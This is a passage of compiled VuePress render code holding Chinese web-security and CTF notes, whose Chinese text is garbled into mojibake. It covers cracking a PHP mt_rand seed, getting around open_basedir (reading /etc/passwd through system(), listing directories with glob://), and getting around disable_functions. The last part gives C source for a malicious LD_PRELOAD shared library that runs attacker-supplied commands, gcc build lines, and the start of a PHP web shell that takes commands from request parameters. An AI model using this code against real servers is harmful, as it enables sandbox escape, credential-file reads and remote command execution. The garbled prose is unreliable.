important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"PHP 7.x"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_srand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("xxxxxxxx"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token shell-comment comment"}},[s._v("# We can't tell you what is xxxxxxxx!")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<br/>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"echo flag{"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mt_rand")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"}"')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n984489752\n619387123\n2070958802\n2105559368\n1909473866\n1679323715\n1910332168\n640569646\n1103001695\n1871111424\nflag\n\nSo, Please guess the flag!\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br")])]),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("./php_mt_seed "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("984489752")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h1",{attrs:{id:"ç»•è¿‡open-basediråˆ—ç›®å½•"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç»•è¿‡open-basediråˆ—ç›®å½•"}},[s._v("#")]),s._v(" ç»•è¿‡Open_basediråˆ—ç›®å½•")]),s._v(" "),a("h3",{attrs:{id:"_1ã€systemå‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_1ã€systemå‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡"}},[s._v("#")]),s._v(" 1ã€systemå‘½ä»¤æ‰§è¡Œå‡½æ•°ç»•è¿‡")]),s._v(" "),a("blockquote",[a("p",[s._v("open_basedir çš„è®¾ç½®å¯¹systemç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°æ˜¯æ— æ•ˆçš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°æ¥è®¿é—®é™åˆ¶ç›®å½•")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("system"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"cat ../../../../../etc/passwd"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("ä½†æ˜¯å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸€èˆ¬éƒ½ä¼šè¢«é™åˆ¶åœ¨disable_functionå½“ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾å…¶ä»–çš„é€”å¾„æ¥ç»•è¿‡é™åˆ¶")]),s._v(" "),a("h3",{attrs:{id:"_2ã€glob-æ•°æ®æµåŒ…è£…å™¨"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_2ã€glob-æ•°æ®æµåŒ…è£…å™¨"}},[s._v("#")]),s._v(" 2ã€glob:// æ•°æ®æµåŒ…è£…å™¨")]),s._v(" "),a("blockquote",[a("p",[s._v("globæ˜¯ç”¨æ¥ç­›é€‰ç›®å½•çš„ä¼ªåè®®ï¼Œç­›é€‰æ—¶ä¸å—"),a("code",[s._v("open_basedir")]),s._v("åˆ¶çº¦")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$b")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("opendir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"glob:///var/www/html/*.php"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("readdir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[s._v("false")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"filename:"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("closedir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("æ›´å¤šæ–¹æ³•å‚è§"),a("a",{attrs:{href:"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("Pç‰›çš„åšå®¢"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"ç»•è¿‡disable-fuction"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ç»•è¿‡disable-fuction"}},[s._v("#")]),s._v(" ç»•è¿‡disable_fuction")]),s._v(" "),a("h3",{attrs:{id:"åˆ©ç”¨dl-å‡½æ•°"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#åˆ©ç”¨dl-å‡½æ•°"}},[s._v("#")]),s._v(" "),a("strong",[s._v("åˆ©ç”¨DL()å‡½æ•°")])]),s._v(" "),a("p",[s._v("dl( ) å‡½æ•°å…è®¸åœ¨phpè„šæœ¬é‡ŒåŠ¨æ€åŠ è½½phpæ¨¡å—ï¼Œé»˜è®¤æ˜¯åŠ è½½extension_dirç›®å½•é‡Œçš„æ‰©å±•")]),s._v(" "),a("p",[s._v("è¯¥é€‰é¡¹æ˜¯PHP_INI_SYSTEMèŒƒå›´å¯ä¿®æ”¹çš„ï¼Œåªèƒ½åœ¨php.iniæˆ–è€…apacheä¸»é…ç½®æ–‡ä»¶é‡Œä¿®æ”¹ã€‚")]),s._v(" "),a("p",[s._v("ä¹Ÿå¯ä»¥é€šè¿‡enable_dlé€‰é¡¹æ¥å…³é—­åŠ¨æ€åŠ è½½åŠŸèƒ½ï¼Œè€Œè¿™ä¸ªé€‰é¡¹é»˜è®¤ä¸ºOnçš„")]),s._v(" "),a("p",[s._v("å¯ä»¥ç”¨"),a("code",[s._v("../")]),s._v("è¿™ç§ç›®å½•éå†çš„æ–¹å¼æŒ‡å®šåŠ è½½ä»»ä½•ä¸€ä¸ªç›®å½•é‡Œçš„soç­‰æ‰©å±•æ–‡ä»¶")]),s._v(" "),a("p",[s._v("æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ è‡ªå·±çš„soæ–‡ä»¶ï¼Œå¹¶ä¸”ç”¨dlå‡½æ•°åŠ è½½è¿™ä¸ªsoæ–‡ä»¶æ‰§è¡Œå‘½ä»¤")]),s._v(" "),a("h3",{attrs:{id:"ld-preload-ç¯å¢ƒå˜é‡"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#ld-preload-ç¯å¢ƒå˜é‡"}},[s._v("#")]),s._v(" "),a("strong",[s._v("LD_PRELOAD ç¯å¢ƒå˜é‡")])]),s._v(" "),a("p",[s._v("LD_PRELOAD æ˜¯Linuxçš„ç¯å¢ƒå˜é‡ï¼Œå®ƒå…è®¸å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“")]),s._v(" "),a("p",[s._v("åœ¨phpä¸­ï¼Œå¯ä½¿ç”¨putenv()å‡½æ•°è®¾ç½®LD_PRELOADç¯å¢ƒå˜é‡æ¥åŠ è½½æŒ‡å®šçš„soæ–‡ä»¶")]),s._v(" "),a("p",[s._v("soæ–‡ä»¶ä¸­åŒ…å«è‡ªå®šä¹‰å‡½æ•°è¿›è¡ŒåŠ«æŒä»è€Œè¾¾åˆ°æ‰§è¡Œæ¶æ„å‘½ä»¤çš„ç›®çš„ã€‚")]),s._v(" "),a("div",{staticClass:"language-c line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//bypass_disablefuc.c")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("define")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token expression"}},[s._v("_GNU_SOURCE")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdlib.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdio.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<string.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("extern")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" environ"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("__attribute__")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("__constructor__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("preload")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" cmdline "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("getenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"EVIL_CMDLINE"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("getenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"LD_PRELOAD"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NULL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unsetenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"LD_PRELOAD"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmdline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmdline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//ç¼–è¯‘æˆåŠ¨æ€é“¾æ¥åº“")]),s._v("\ngcc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("shared "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("fPIC bypass_disablefuc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("c "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("o bypass_disablefunc_x64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("so\n    \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//è‹¥ç›®æ ‡ä¸º x86 æ¶æ„ï¼Œéœ€è¦åŠ ä¸Š -m32")]),s._v("\ngcc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("shared "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("fPIC bypass_disablefuc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("c "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("m32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("o bypass_disablefunc_x32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br")])]),a("p",[s._v("å†å†™ä¸€ä¸ªPHPï¼Œ ç”¨putenvæ·»åŠ ç¯å¢ƒå˜é‡(ä¸€ä¸ªæ˜¯ä¸Šä¼ çš„soåº“åœ°å€ã€ä¸€ä¸ªæ˜¯è¦æ‰§è¡Œçš„å‘½ä»¤)ã€‚")]),s._v(" "),a("p",[s._v("å°†systemå‘½ä»¤è¾“å‡ºå†…å®¹å†™å…¥æŒ‡å®šæ–‡ä»¶ï¼Œç„¶åè¯»å‡ºã€‚")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("//bypass_disablefunc.php \n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n \t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/html/bypass_disablefunc_x64.so </p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n\t"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"cmd"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"outpath"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$evil_cmdline")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token 